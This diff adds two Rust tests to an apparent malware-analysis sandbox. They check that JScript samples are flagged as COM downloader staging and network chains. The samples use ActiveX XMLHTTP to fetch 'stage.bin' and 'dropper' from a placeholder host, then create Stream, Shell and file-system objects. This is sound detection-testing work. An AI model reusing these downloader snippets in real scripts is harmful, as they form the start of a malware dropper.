@@ -190,6 +190,63 @@ fn sandbox_flags_com_downloader_execution_chain() {
 
 #[cfg(feature = "js-sandbox")]
 #[test]
+fn sandbox_flags_com_downloader_staging_chain() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+        xhr.open('GET', 'http://example.invalid/stage.bin', false);
+        xhr.send();
+        xhr.setRequestHeader('User-Agent', 'Mozilla/5.0');
+        var stream = new ActiveXObject('ADODB.Stream');
+        stream.Open();
+        var shell = new ActiveXObject('WScript.Shell');
+        shell.ExpandEnvironmentStrings('%TEMP%');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "com_downloader_staging_chain"),
+                "expected COM downloader staging pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_flags_com_downloader_network_chain() {
+    let options = DynamicOptions::default();
+    let payload = br#"
+        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+        xhr.open('GET', 'http://example.invalid/dropper', false);
+        xhr.send();
+        var folder = WScript.CreateObject('Scripting.FileSystemObject');
+        folder.CreateFolder('C:\\Temp\\cache');
+    "#;
+    let outcome = js_analysis::run_sandbox(payload, &options);
+    match outcome {
+        DynamicOutcome::Executed(signals) => {
+            assert!(
+                signals
+                    .behavioral_patterns
+                    .iter()
+                    .any(|pattern| pattern.name == "com_downloader_network_chain"),
+                "expected COM downloader network pattern: {:?}",
+                signals.behavioral_patterns
+            );
+        }
+        _ => panic!("expected executed"),
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
 fn sandbox_omits_delta_summary_without_dynamic_code() {
     let options = DynamicOptions::default();
     let outcome = js_analysis::run_sandbox(b"app.alert('hello')", &options);
